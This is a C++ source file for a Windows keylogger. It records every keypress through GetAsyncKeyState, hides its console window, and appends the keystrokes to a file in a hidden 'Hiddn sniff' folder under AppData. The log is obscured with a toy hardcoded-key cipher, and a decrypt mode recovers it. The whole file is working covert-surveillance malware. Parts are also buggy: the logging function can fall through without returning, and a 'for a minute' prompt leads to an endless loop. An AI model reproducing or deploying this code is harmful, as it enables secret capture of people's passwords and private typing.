#include <iostream>
#include <fstream>
#include <string>
#include <Windows.h>
#include <iomanip>
#include <sstream>
#include <map>
#include <thread>
#include <ShlObj.h> //a librery that allows you to retrieve paths to special folders

#define DELAY 150
#define GLOBAL_PARAM_P 8200 //arbitrary keys
#define global_param_g 4 //arbitrary keys

class FileHandler
{
public:
	static bool DirectoryExists(const std::wstring& path) {
		DWORD attributes = GetFileAttributes(path.c_str());
		return (attributes != INVALID_FILE_ATTRIBUTES && (attributes & FILE_ATTRIBUTE_DIRECTORY));
	}

	static std::string getLocalPath() {
		PWSTR appDataPath;
		//notice this function allocates memory!
		if (SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &appDataPath) != S_OK) {
			std::cerr << "Error getting AppData folder path." << std::endl;
			return "";
		}

		std::wstring directoryPath = std::wstring(appDataPath) + L"\\Hiddn sniff";
		if (!DirectoryExists(directoryPath)) {
			// Create the directory
			if (!CreateDirectory(directoryPath.c_str(), NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
				std::cerr << "Error creating directory." << std::endl;
				return "";
			}
			else {
				//make the directory hidden
				SetFileAttributes(directoryPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
				std::wcout << "Directory created successfully: " << directoryPath << std::endl;
			}
		}
		// Release allocated memory
		CoTaskMemFree(appDataPath);
		return std::string(directoryPath.begin(), directoryPath.end());
	}
};


class KeyLogger
{
private:
	std::string logWithEdgeCases(int key) {
		std::map<int, std::string> edgeCases = {
			{VK_SPACE, " "},
			{'¾', "."},
			{VK_RETURN, "\n"},
			{VK_SHIFT, "[SHIFT]"},
			{VK_BACK, "\b"},
			{VK_RBUTTON, "[R_CLICK]"},
			{VK_CAPITAL, "[CAPS_LOCK]"},
			{VK_TAB, "\t"},
			{VK_UP, "[UP]"},
			{VK_DOWN, "[DOWN]"},
			{VK_LEFT, "[LEFT]"},
			{VK_RIGHT, "[RIGHT]"},
			{VK_CONTROL, "[CTRL]"},
			{VK_MENU, "[ALT]"}
		};

		auto it = edgeCases.find(key);
		if (it != edgeCases.end()) {
			return it->second;
		}
		else {
			return std::string(1, static_cast<char>(key));
		}
	}

public:
	std::string log() {
		for (int key = 8; key <= 190; key++) //for each kery check the MSB, the largest ascii being 172 for del
		{
			//check if the MSB in the result of the state of the key is 1 using bitwise &
			if (GetAsyncKeyState(key) & 0x8000) {
				std::cout << std::string(1, static_cast<char>(key)) << std::endl;
				// Add a delay to prevent registering multiple key presses too quickly
				std::this_thread::sleep_for(std::chrono::milliseconds(DELAY));
				return logWithEdgeCases(key);
			}
		}
	}
};

enum Mode {
	ENCRYPT,
	DECRYPT
}; 
 
class Encryptor {
private:
	Mode mode;
	long long int publicKeyA = 0;  // Initialize to some default value
	long long int publicKeyB = 0;  // Initialize to some default value
	// notice! a<p, b<p
	const long long int privateKeyA = 49; //arbitrary keys
	const long long int privateKeyB = 11; //arbitrary keys

	void initializePublicKeys() {
		publicKeyA = power(global_param_g, privateKeyA, GLOBAL_PARAM_P);
		publicKeyB = power(global_param_g, privateKeyB, GLOBAL_PARAM_P);
	}

	int diffieHelman(char& text) {
		// Initialize public keys if not done already
		if (publicKeyA == 0 || publicKeyB == 0) {
			initializePublicKeys();
		}
		std::cout << "encrypting!" << std::endl;
		// create common key
		const long long int x = power(publicKeyB, privateKeyA, GLOBAL_PARAM_P);
		// now you can use the common key x to encrypt your message
		// convert text to int t
			//convert to ascii
			int value = text;
			// Pad with leading zeros if needed
			std::ostringstream oss;
			oss << std::setw(3) << std::setfill('0') << text;

			// Convert back to integer
			int paddedInteger = std::stoi(oss.str());
			std::cout << "ascii: " << value << std::endl;
		
		// encrypted text = (t+x) % p
		int incrypted = (value + x) % GLOBAL_PARAM_P;
		std::cout << "incrypted value: " << incrypted << std::endl;
		return incrypted;
	}

	char decrypt(int& incryptedText) {
		// Initialize public keys if not done already
		if (publicKeyA == 0 || publicKeyB == 0) {
			initializePublicKeys();
		}
		std::cout << "decrypting value!" << std::endl;
		// create common key
		const long long int x = power(publicKeyA, privateKeyB, GLOBAL_PARAM_P);

		// now you can use the common key x to decrypt your message
		// decrypted text = (t - x) % p.
		std::cout << "decrypting: "<< incryptedText << std::endl;
		int decrypted = (incryptedText - x) % GLOBAL_PARAM_P;
		std::cout << "ascii: " << decrypted << std::endl;
		// convert text to int it
		char msg = static_cast<int>(decrypted);
		std::cout << "msg: " << msg << std::endl;

		return msg;
	}

	long long int power(long long int g, long long int a, long long int p) {
			if (a == 1) {
				return g % p;  // Base case, calculating using % to prevent overflow
			}
			else {
				return (g % p) * power(g, a - 1, p) % p;  // Recursive case
			}
	}


public:
	void runEncryptor(std::string logPath, std::string& str) {
		if (mode == ENCRYPT) {
			std::ofstream cryptedFileWriter;
			cryptedFileWriter.open(logPath, std::ios::app);
			for (char& c : str) {
				int res = diffieHelman(c);
				//append to file
				cryptedFileWriter << res;
			}
			cryptedFileWriter.close();
		}
	}
	void runDecryptor(std::string logPath, std::string solutionPath){
		// Read four digits at a time
		char buffer[5];  // Including null for end of arr
		std::ifstream fileDecryptReader(logPath);
		std::ofstream fileSolutionWriter;
		while (fileDecryptReader.read(buffer, 4)) {
			buffer[4] = '\0';  // Null for end the buffer
			int value = std::stoi(buffer);
			std::cout << "solving " << value << std::endl;
			char c = decrypt(value);
			std::cout << "the char is " << c << std::endl;
			fileSolutionWriter.open(solutionPath, std::ios::app);
			fileSolutionWriter << c;
			fileSolutionWriter.close();
		}
	}

	void setMode(const Mode& m) {
		mode = m;
	}
};

int main() {
	std::string basePath = FileHandler::getLocalPath();
	
	if (basePath.empty()) {
		// Handle the error or exit the program
		return 1;
	}
	std::string logPath = basePath + "\\encryptedLog.txt";
	std::string solutionPath = basePath + "\\solution.txt";
	std::cout << basePath << std::endl;
	KeyLogger logger;
	Encryptor encryptor;

	std::string input = " ";
	while (input != "e" && input != "E" && input != "D" && input != "d") {
		std::cout << "notice you need to set the mode. would you like to sniff and encrypt for a minute(e) or decrypt the log file(d)?" << std::endl;
		std::cin >> input;
	}

	//hide terminal window
	HWND hwnd = GetConsoleWindow();
	ShowWindow(hwnd, SW_HIDE);

	if (input == "e" || input == "E") {
		while (true) {
			std::string data = logger.log();
			std::cout << data;
			encryptor.setMode(ENCRYPT);
			encryptor.runEncryptor(logPath, data);
		}
	} else { 
		encryptor.setMode(DECRYPT); 
		encryptor.runDecryptor(logPath, solutionPath);
	}
    return 0;
}
